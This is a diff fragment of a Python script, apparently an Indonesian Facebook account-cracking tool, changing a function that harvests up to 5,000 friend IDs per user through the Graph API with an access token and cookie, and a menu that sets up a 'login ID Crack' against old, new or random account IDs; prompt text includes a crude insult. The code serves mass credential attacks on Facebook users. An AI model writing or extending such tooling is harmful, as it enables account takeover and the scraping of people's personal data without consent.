@@ -668,7 +668,7 @@ def massal():
 	           'fields': "friends"
 	           }	           
 	       )
-	       url = requests.get('https://graph.facebook.com/{}'.format(user),params=params,headers=head,Kues={'Kues':cok}).json()
+	       url = requests.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
 	       for xr in url['friends']['data']:
 	           try:
 	               woy = (xr['id']+'|'+xr['name'])
@@ -688,7 +688,7 @@ def massal():
 		exit()
 ###----------[ ATUR SBLUM KREK ]----------###
 def setting():
-	prints(nel(f'               {P2}{B}login ID Crack{P2}',width=70,padding=(0,7),style=f"{color_panel}")) 
+	prints(nel(f'                   {P2}{B}login ID Crack{P2}',width=70,padding=(0,7),style=f"{color_panel}")) 
 	cetak(nel(f"{P2}[{color_text}01{P2}]. Facebook ID {M2}Old\n{P2}[{color_text}02{P2}]. Facebook ID {K2}New\n{P2}[{color_text}03{P2}]. Facebook ID {H2}Random{P2}",title=f"{H2}{len(id)}{P2}{U} ID TELAH DIKUMPULKAN",width=70,padding=(0,7),style=f"{color_panel}")) 
 	hu = input(f'✶ ━━⫸{H} Input :{H} ')
 	if hu in ['1','01']:
@@ -724,9 +724,9 @@ def setting():
 	else:
 		method.append('metod1')
 	print('')
-	_jembot_ = input('>> Tambahkan Aplikasi Terkait ( Y/t ) ')
+	_jembot_ = input('✶ ━━⫸{U} Tambahkan Aplikasi Terkait{N} ( Y/t ) ')
 	if _jembot_ in ['']:
-		print('>> Pilih Yang Bener Kontol ')
+		print(' Pilih Yang Bener Kontol ')
 		back()
 	elif _jembot_ in ['y','Y']:
 		taplikasi.append('ya')
